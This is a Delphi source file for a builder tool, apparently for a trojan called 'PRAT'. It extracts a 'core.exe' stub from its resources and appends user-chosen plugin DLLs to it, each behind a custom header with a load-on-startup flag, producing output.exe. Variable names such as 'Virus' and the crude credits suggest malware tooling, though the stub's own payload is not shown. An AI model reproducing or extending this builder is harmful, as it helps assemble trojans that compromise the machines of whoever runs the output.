   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, StdCtrls, ExtCtrls, ComCtrls, Menus;

   type
     TForm1 = class(TForm)
       ListView1: TListView;
       Panel1: TPanel;
       Button1: TButton;
       Button2: TButton;
       Button3: TButton;
       OpenDialog1: TOpenDialog;
       PopupMenu1: TPopupMenu;
       MainFunction1: TMenuItem;
       N1: TMenuItem;
       LoadOnStartup1: TMenuItem;
       DontLoadOnStartup1: TMenuItem;
       Button4: TButton;
       procedure FormMouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure Button1MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure Button2MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure Button3MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure ListView1MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure Panel1MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
       procedure Button1Click(Sender: TObject);
       procedure Button2Click(Sender: TObject);
       procedure MainFunction1Click(Sender: TObject);
       procedure LoadOnStartup1Click(Sender: TObject);
       procedure DontLoadOnStartup1Click(Sender: TObject);
       procedure ListView1MouseDown(Sender: TObject; Button: TMouseButton;
         Shift: TShiftState; X, Y: Integer);
       procedure Button3Click(Sender: TObject);
       procedure Button4Click(Sender: TObject);
       procedure Button4MouseMove(Sender: TObject; Shift: TShiftState; X,
         Y: Integer);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

     Type
     TAttachmentHeader = record
       MagicNumber: cardinal;
       CRC: cardinal;
       Size: int64;
       IsStub: boolean;
       FileName: array[0..MAX_PATH] of char;
     end;
     PAttachmentHeader = ^TAttachmentHeader;
       GetNameFunction = function : PChar;

   var
     Form1: TForm1;
     Virus  : tHandle;
     OutPut : tHandle;
     Header : tAttachmentHeader;
     itemHeader : pAttachmentHeader;

     fName  : String;
     StubSize : int64;

   implementation

   uses Unit2;

   {$R *.dfm}
   {$R core.res}

   Function FFileSize(FileName: String): int64;
   Var
     H: tHandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindCLose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 +
       fData.nFileSizeLow;
     End;
   End;

   Function GetHeader(FileW: String): pAttachmentHeader;
   Var
     Header: pAttachmentHeader;
   Begin
     Header := AllocMem(SizeOf(tAttachmentHeader));
     StrLCopy(@Header.Filename, pChar(FileW), MAX_PATH);
     Header.Size := FFileSize(FileW);
     Header.IsStub := False;
     Result := Header;
   End;

   Procedure AttachDll(eName:String);
   Var
     Buffer: Array[0..2048] Of Char;
     BytesRead, BytesWritten: LongWord;
     F: File;
     Str: String;
     I,J: Integer;
     Nig: array[0..MAX_PATH] of char;
     dName, dStr :String;
   Begin

     ZeroMemory(@Buffer, SizeOf(Buffer));
     Output := CreateFile(pChar(ExtractFilePath(ParamStr(0))+'output.exe'),
                          GENERIC_WRITE,
                          FILE_SHARE_WRITE,
                          NIL, CREATE_NEW,
                          FILE_ATTRIBUTE_NORMAL,
                          0);

       itemHeader := GetHeader(eName);
       fName := StrPas(@itemHeader.FileName);

       Virus := CreateFile(pChar(fName),
                           GENERIC_READ,
                           FILE_SHARE_READ,
                           NIL, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           0);

       Repeat
         ReadFile (Virus, Buffer, 2048, BytesRead, NIL);
         WriteFile(Output, Buffer, BytesRead, BytesWritten, NIL);
       Until BytesWritten = 0;
       CloseHandle(Virus);

     For I := 0 To Form1.ListView1.Items.Count -1 Do
     Begin

       dName := Form1.ListView1.Items[i].Caption;

       If Form1.ListView1.Items[i].SubItems[2] = 'Yes' Then
         dStr := '1'+ExtractFileName(Form1.ListView1.Items[i].Caption)+';'+Form1.ListView1.Items[i].SubItems[0]
       Else
         dStr := '0'+ExtractFileName(Form1.ListView1.Items[i].Caption)+';'+Form1.ListView1.Items[i].SubItems[0];

       itemHeader := GetHeader(dName);
       fName := StrPas(@itemHeader.Filename);

       Header.MagicNumber := $FEEDBEEF;
       Header.CRC := 0;
       Header.Size := FFileSize(dName);
       Header.IsStub := False;
       FillChar(Header.Filename, MAX_PATH+1, 0);
       For J := 1 To Length(dStr) Do
         Header.FileName[J-1] := Char(Ord(dStr[J]));

       WriteFile(Output, Header, SizeOf(Header), BytesWritten, NIL);


       Virus := CreateFile(pChar(fName),
                           GENERIC_READ,
                           FILE_SHARE_READ,
                           NIL, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           0);

       Repeat
         ReadFile (Virus, Buffer, 2048, BytesRead, NIL);
         WriteFile(Output, Buffer, BytesRead, BytesWritten, NIL);
       Until BytesWritten = 0;
       CloseHandle(Virus);
     End;
     itemHeader := GetHeader(eName);
     fName := StrPas(@itemHeader.Filename);
     StubSize := FFileSize(fName);

     Header.MagicNumber := $FEEDBEEF;
     Header.CRC := 0;
     Header.Size := StubSize;
     Header.IsStub := True;

     FillChar(Header.Filename, MAX_PATH+1, 0);

     WriteFile(Output, Header, SizeOf(Header), BytesWritten, NIL);

     CloseHandle(Output);
   End;

   procedure TForm1.FormMouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
     Panel1.Caption := '';
   end;

   procedure TForm1.Button1MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
     Panel1.Caption := 'Add a plugin into the list';
   end;

   procedure TForm1.Button2MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
     Panel1.Caption := 'Remove a plugin from the list';
   end;

   procedure TForm1.Button3MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   var
     I:Integer;
     B:Integer;
     Kb:Integer;
   begin
     B := 13312;
     Kb := 0;

     For I:=0 To ListView1.Items.Count -1 Do
       B := (B + StrToInt(ListView1.Items[i].SubItems[1]));

     While B >= 1024 Do
     Begin
       Kb := Kb + 1;
       B := B - 1024;
     End;

     Panel1.Caption := 'Compile together all dlls (~'+inttostr(kb)+'.'+inttostr(b)+' kb)';
   end;

   procedure TForm1.ListView1MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
     Panel1.Caption := 'Your list with all plugins selected';
   end;

   procedure TForm1.Panel1MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
     Panel1.Caption := 'Look, its the statusbar!! \o/';
   end;

   procedure TForm1.Button1Click(Sender: TObject);
   Var
     Item: TListItem;
     I   : Integer;
     Name: String;
   begin
     If OpenDialog1.Execute Then
     Begin
       For I := 0 To OpenDialog1.Files.Count -1 Do
       Begin
         Item := ListView1.Items.Add;
         Item.Caption := OpenDialog1.Files.Strings[i];
         Item.SubItems.Add('Init');
         Item.SubItems.Add(IntToStr(FFileSize(Item.Caption)));
         Item.SubItems.Add('Yes');
         Try
           Name := GetNameFunction(GetProcAddress(LoadLibrary(PChar(OpenDialog1.Files.Strings[i])), 'GetName'));
           Item.SubItems.Add(Name);
         Except
           Item.SubItems.Add('');
         End;
       End;
     End;
   end;

   procedure TForm1.Button2Click(Sender: TObject);
   begin
     If ListView1.ItemIndex >= 0 Then ListView1.ItemFocused.Delete;
   end;

   procedure TForm1.MainFunction1Click(Sender: TObject);
   begin
     If ListView1.ItemIndex >= 0 Then
       ListView1.ItemFocused.SubItems[0] :=
       InputBox('Main Function', 'Insert name of Main Function', 'Init');
   end;

   procedure TForm1.LoadOnStartup1Click(Sender: TObject);
   begin
     If ListView1.ItemIndex >= 0 Then
       ListView1.ItemFocused.SubItems[2] := 'Yes';
   end;

   procedure TForm1.DontLoadOnStartup1Click(Sender: TObject);
   begin
     If ListView1.ItemIndex >= 0 Then
       ListView1.ItemFocused.SubItems[2] := 'No';
   end;

   procedure TForm1.ListView1MouseDown(Sender: TObject; Button: TMouseButton;
     Shift: TShiftState; X, Y: Integer);
   var
     p:TPoint;
   begin
     If Button = mbRight Then
     Begin
       GetCursorPos(P);
       PopupMenu1.Popup(p.X,p.Y);
     End;
   end;

   procedure ExtractFile(whichone: String);
   var
   ResultFilePath,ResourcePointer: PChar;
   ResourceLocation: HRSRC;
   ResourceSize,byteswritten: Longword;
   ResDataHandle: THandle;
   FileHandle: THandle;
   begin

   ResultFilePath := pChar(ExtractFilePath(ParamStr(0))+'core.exe');

   ResourceLocation := FindResource(HInstance,PChar(whichone),RT_RCDATA);
   if ResourceLocation = 0 then exit;

   ResourceSize := SizeofResource(HInstance,ResourceLocation);
   if ResourceSize = 0 then exit;

   ResDataHandle := LoadResource(HInstance,ResourceLocation);
   if ResDataHandle = 0 then exit;

   ResourcePointer := LockResource(ResDataHandle);
   if ResourcePointer = NIL then exit;

   FileHandle := CreateFile(ResultFilePath,GENERIC_WRITE,FILE_SHARE_WRITE,NIL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);

   if FileHandle = INVALID_HANDLE_VALUE then exit;

   WriteFile(FileHandle,ResourcePointer^,ResourceSize,byteswritten,NIL);

   CloseHandle(FileHandle);
   end;

   procedure TForm1.Button3Click(Sender: TObject);
   Var
     I:Integer;
   begin
     If ListView1.Items.Count <= 0 Then Exit;

     ExtractFile('core');
     AttachDll('core.exe');
     {
     For i := 0 To ListView1.Items.Count -1 Do
     Begin
       If ListView1.Items[i].SubItems[2] = 'Yes' Then
       AttachDll('core.exe',
                 ListView1.Items[i].Caption,
                 '1'+ExtractFileName(ListView1.Items[i].Caption)+';'+ListView1.Items[i].SubItems[0])
       Else
       AttachDll('core.exe',
                 ListView1.Items[i].Caption,
                 '0'+ExtractFileName(ListView1.Items[i].Caption)+';'+ListView1.Items[i].SubItems[0]);
       If FileExists('output.exe') Then
       Begin
         Repeat
           CopyFile('output.exe','core.exe',false);
         Until FFileSize('output.exe') = FFileSize('core.exe');
       End;
     End;
     }
     DeleteFile('core.exe');
     MessageBox(0, 'Build done','Done',mb_ok);
   end;

   procedure TForm1.Button4Click(Sender: TObject);
   begin
     Form2.Show;
   end;

   procedure TForm1.Button4MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
     Panel1.Caption := 'About the fucktards behind PRAT';
   end;

   end.
